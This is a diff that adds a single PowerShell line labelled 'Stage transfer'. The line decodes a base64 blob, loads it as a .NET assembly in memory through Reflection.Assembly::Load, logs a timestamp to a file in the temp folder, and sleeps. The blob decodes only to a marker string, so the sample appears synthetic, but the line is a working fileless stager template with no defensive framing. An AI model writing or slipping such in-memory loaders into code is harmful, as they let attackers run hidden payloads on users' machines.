@@ -1,0 +1,1 @@
+<# Stage transfer #> $ManagedBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjppYzYxaDA2c3Yx'); Write-Verbose ("Assembly bytes: " + $ManagedBytes.Length); [Reflection.Assembly]::Load($ManagedBytes); Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append; Start-Sleep -Seconds 3
